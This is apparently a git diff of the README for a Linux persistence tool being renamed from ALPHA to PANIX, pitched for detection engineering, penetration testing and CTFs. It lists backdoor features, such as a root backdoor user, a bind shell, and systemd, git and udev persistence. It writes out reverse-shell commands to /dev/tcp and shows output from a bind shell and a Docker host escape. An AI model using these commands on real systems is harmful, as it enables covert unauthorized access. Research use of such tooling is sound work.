@@ -1,21 +1,21 @@
 <p align="center">
-  <img src="https://github.com/Aegrah/ALPHA/assets/78494512/2b21f530-9763-4c10-af8c-9ca97443f351" alt="ALPHA logo" width="1010" height="500"> 
-  <h1 align="center"><a href="https://github.com/Aegrah/ALPHA/">ALPHA - Aegrah's Linux Persistence Honed Assistant</a></h1>
+  <img src="https://github.com/Aegrah/PANIX/assets/78494512/2b21f530-9763-4c10-af8c-9ca97443f351" alt="PANIX logo" width="1010" height="500"> 
+  <h1 align="center"><a href="https://github.com/Aegrah/PANIX/">PANIX - Persistence Against *NIX</a></h1>
 </p>
 
 ![](https://i.imgur.com/waxVImv.png)
 
-ALPHA is a Linux persistence tool for security research, detection engineering, penetration testing, and CTFs. It prioritizes functionality over stealth and is easily detectable. ALPHA is supported on popular distributions like Debian, Ubuntu, and RHEL, and is highly customizable to fit various OS environments.
+PANIX is a highly customizable Linux persistence tool for security research, detection engineering, penetration testing, CTFs and more. It prioritizes functionality over stealth and is easily detectable. PANIX is supported on popular distributions like Debian, Ubuntu, and RHEL, and is highly customizable to fit various OS environments. PANIX will be kept up-to-date with the most common *nix persistence mechanisms observed in the wild.
 
 ![](https://i.imgur.com/waxVImv.png)
 
 # Features
-ALPHA provides a versatile suite of features for simulating and researching Linux persistence mechanisms.
+PANIX provides a versatile suite of features for simulating and researching Linux persistence mechanisms.
 
 | Feature                          | Description                                                                             | Root | User |
 |----------------------------------|-----------------------------------------------------------------------------------------|------|------|
 | **At Job Persistence**           | At job persistence                                                                      | ✓    | ✓    |
-| **Authorized Keys Management**   | Add public key to authorized keys                                                       | ✓    | ✓    |
+| **Authorized Keys Persistence**   | Add public key to authorized keys                                                      | ✓    | ✓    |
 | **Backdoor User**                | Create backdoor user with uid=0                                                         | ✓    | ✗    |
 | **Bind Shell**                   | Execute backgrounded bind shell                                                         | ✓    | ✓    |
 | **Capabilities Backdoor**        | Add capabilities for persistence                                                        | ✓    | ✗    |
@@ -44,7 +44,7 @@ ALPHA provides a versatile suite of features for simulating and researching Linu
 ![](https://i.imgur.com/waxVImv.png)
 
 # Support
-ALPHA offers comprehensive support across various Linux distributions.
+PANIX offers comprehensive support across various Linux distributions.
 
 | Distribution     | Support | Tested                                                |
 |------------------|---------|-------------------------------------------------------|
@@ -63,28 +63,30 @@ Dated or custom Linux distributions may use different configurations or lack spe
 ![](https://i.imgur.com/waxVImv.png)
 
 # Getting Started
-Getting ALPHA up-and-running is as simple as downloading the script from the [release page](https://github.com/Aegrah/ALPHA/releases/tag/alpha-v1.0.0) and executing it:
+Getting PANIX up-and-running is as simple as downloading the script from the [release page](https://github.com/Aegrah/PANIX/releases/tag/panix-v1.0.0) and executing it:
 ```
-curl -sL https://github.com/Aegrah/ALPHA/releases/download/alpha-v1.0.0/alpha.sh | bash
+curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v1.0.0/panix.sh | bash
 ```
 Or download it and execute it manually:
 ```
 # Download through curl or wget
-curl -sL https://github.com/Aegrah/ALPHA/releases/download/alpha-v1.0.0/alpha.sh -o alpha.sh
-wget https://github.com/Aegrah/ALPHA/releases/download/alpha-v1.0.0/alpha.sh -O alpha.sh
+curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v1.0.0/panix.sh -o panix.sh
+wget https://github.com/Aegrah/PANIX/releases/download/panix-v1.0.0/panix.sh -O panix.sh
 
 # Grant execution permissions and execute the script.
-chmod +x alpha.sh
-./alpha.sh
+chmod +x panix.sh
+./panix.sh
 ```
 
 Executing the script will either show the `root` or `user` help menu, depending on the privileges the current user has.
 
 ```
-alpha@alpha-demo:~$ sudo ./alpha.sh
-           __
- /\  |    |__) |__|  /\
-/~~\ |___ |    |  | /~~\
+panix@panix-demo:~$ sudo ./panix.sh
+ __
+|__)  /\  |\ | | \_/
+|    /~~\ | \| | / \
+
+@RFGroenewoud
 
 Root User Options:
 
@@ -113,20 +115,20 @@ Root User Options:
   --systemd             Systemd service persistence
   --udev                Udev (driver) persistence
   --xdg                 XDG autostart persistence
-  --revert              Revert most changes made by ALPHA's default options
+  --revert              Revert most changes made by PANIX's default options
   --quiet (-q)          Quiet mode (no banner)
 ```
 
 ![](https://i.imgur.com/waxVImv.png)
 
 # Examples
-The script should be largely self-explanatory, however, this section will show a few examples of how to work with ALPHA.
+The script should be largely self-explanatory, however, this section will show a few examples of how to work with PANIX.
 
 Every persistence mechanism has a separate help menu:
 
 ```
-root@ubuntu2204:/home/ruben# ./alpha.sh --udev --help
-Usage: ./alpha.sh --udev [OPTIONS]
+root@ubuntu2204:/home/ruben# ./panix.sh --udev --help
+Usage: ./panix.sh --udev [OPTIONS]
 --examples                   Display command examples
 --default                    Use default udev settings
   --ip <ip>                    Specify IP address
@@ -139,19 +141,19 @@ Usage: ./alpha.sh --udev [OPTIONS]
 
 Every persistence mechanism also has an `--examples` flag that shows default and custom examples, aiding in crafting the command that works for you.
 ```
-root@ubuntu2204:/home/ruben# ./alpha.sh --git --examples
+root@ubuntu2204:/home/ruben# ./panix.sh --git --examples
 Examples:
 --default:
-./alpha.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager
+./panix.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager
 
 --custom:
-./alpha.sh --git --custom --command "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &" --path "gitdir/.git/hooks/pre-commit" --hook
+./panix.sh --git --custom --command "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &" --path "gitdir/.git/hooks/pre-commit" --hook
 
-./alpha.sh --git --custom --command "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & ${PAGER:-less}" --path "~/.gitconfig --pager"
+./panix.sh --git --custom --command "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & ${PAGER:-less}" --path "~/.gitconfig --pager"
 ```
 Most of the persistence mechanisms are very simple, and will (hopefully) not require much explanation. For example, systemd persistence can be set up simply through executing:
 ```
-root@ubuntu2204:/home/ruben# ./alpha.sh --systemd --default --ip 10.10.10.10 --port 1337
+root@ubuntu2204:/home/ruben# ./panix.sh --systemd --default --ip 10.10.10.10 --port 1337
 Service file created successfully!
 Timer file created successfully!
 Created symlink /etc/systemd/system/timers.target.wants/dbus-org.freedesktop.resolved.timer → /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer.
@@ -159,7 +161,7 @@ Created symlink /etc/systemd/system/timers.target.wants/dbus-org.freedesktop.res
 ```
 When setting up a persistence mechanism, the script will let you know whether it worked, and in cases where information is needed to work with the persistence mechanism, additional information is provided. For example the bind shell mechanism:
 ```
-root@ubuntu2204:/home/ruben# ./alpha.sh --bind-shell --default --architecture x64
+root@ubuntu2204:/home/ruben# ./panix.sh --bind-shell --default --architecture x64
 [+] Bind shell binary /tmp/bd64 created and executed in the background.
 [+] The bind shell is listening on port 9001.
 [+] To interact with it from a different system, use: nc -nv <IP> 9001
@@ -174,7 +176,7 @@ root
 ```
 The same goes for mechanisms that have additional built-in features such as the Docker persistence mechanism, with a built-in root host escape:
 ```
-ruben@ubuntu2204:~$ sudo ./alpha.sh --docker-container --ip 192.168.211.131 --port 330
+ruben@ubuntu2204:~$ sudo ./panix.sh --docker-container --ip 192.168.211.131 --port 330
 [+] Building 10.4s (9/9) FINISHED                                                                                                                                            docker:default
  => [internal] load build definition from Dockerfile                                                                                                                                   0.0s
  => => transferring dockerfile: 722B                                                                                                                                                   0.0s
@@ -210,9 +212,9 @@ connect to [192.168.211.131] from (UNKNOWN) [192.168.211.130] 43400
 root@ubuntu2204:~#
 ```
 
-ALPHA can clean most of its mess through the `--revert` command.
+PANIX can clean most of its mess through the `--revert` command.
 ```
-root@ubuntu2204:/home/ruben# ./alpha.sh --revert
+root@ubuntu2204:/home/ruben# ./panix.sh --revert
 [*] Running as root...
 [*] Cleaning Systemd persistence methods...
 [+] Successfully cleaned persistence method Systemd
@@ -227,7 +229,7 @@ root@ubuntu2204:/home/ruben# ./alpha.sh --revert
 
 ![](https://i.imgur.com/waxVImv.png)
 # Publications and Resources
-Publications in which ALPHA is leveraged:
+Publications in which PANIX is leveraged:
 
 - [Linux Detection Engineering - The Basics of Linux Persistence](link) (will be published soon...)
 - [Linux Detection Engineering - Beyond the Basics of Linux Persistence](link) (will be published soon...)
@@ -243,15 +245,15 @@ Feel free to check out my socials for updates on (Linux) security research.
 ![](https://i.imgur.com/waxVImv.png)
 
 # Share
-By sharing [ALPHA](https://github.com/Aegrah/ALPHA), you can assist others in testing and improving their security posture and support the development of new detection capabilities in Linux security.
+By sharing [PANIX](https://github.com/Aegrah/PANIX), you can assist others in testing and improving their security posture and support the development of new detection capabilities in Linux security.
 
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-reddit-red?logo=reddit)](https://reddit.com/submit?url=[https://github.com/Aegrah/ALPHA](https://github.com/Aegrah/ALPHA)&title=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20\(ALPHA\))
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-hacker%20news-orange?logo=ycombinator)](https://news.ycombinator.com/submitlink?u=https://github.com/Aegrah/ALPHA)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-twitter-03A9F4?logo=twitter)](https://twitter.com/share?url=https://github.com/Aegrah/ALPHA&text=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20\(ALPHA\))
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-facebook-1976D2?logo=facebook)](https://www.facebook.com/sharer/sharer.php?u=https://github.com/Aegrah/ALPHA)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-linkedin-3949AB?logo=linkedin)](https://www.linkedin.com/shareArticle?url=https://github.com/Aegrah/ALPHA&title=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20(ALPHA))
+[![GitHub Repo stars](https://img.shields.io/badge/share%20on-reddit-red?logo=reddit)](https://reddit.com/submit?url=[https://github.com/Aegrah/PANIX](https://github.com/Aegrah/PANIX)&title=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20\(PANIX\))
+[![GitHub Repo stars](https://img.shields.io/badge/share%20on-hacker%20news-orange?logo=ycombinator)](https://news.ycombinator.com/submitlink?u=https://github.com/Aegrah/PANIX)
+[![GitHub Repo stars](https://img.shields.io/badge/share%20on-twitter-03A9F4?logo=twitter)](https://twitter.com/share?url=https://github.com/Aegrah/PANIX&text=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20\(PANIX\))
+[![GitHub Repo stars](https://img.shields.io/badge/share%20on-facebook-1976D2?logo=facebook)](https://www.facebook.com/sharer/sharer.php?u=https://github.com/Aegrah/PANIX)
+[![GitHub Repo stars](https://img.shields.io/badge/share%20on-linkedin-3949AB?logo=linkedin)](https://www.linkedin.com/shareArticle?url=https://github.com/Aegrah/PANIX&title=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20(PANIX))
 
 ![](https://i.imgur.com/waxVImv.png)
 
 # Disclaimer
-ALPHA is intended for authorized security testing and research purposes only. Misuse of this tool for malicious activities is not condoned and is entirely at the user's own risk. By using ALPHA, you agree that you are responsible for your own actions. Just don't do stupid stuff.
+PANIX is intended for authorized security testing and research purposes only. Misuse of this tool for malicious activities is not condoned and is entirely at the user's own risk. By using PANIX, you agree that you are responsible for your own actions. Just don't do stupid stuff.
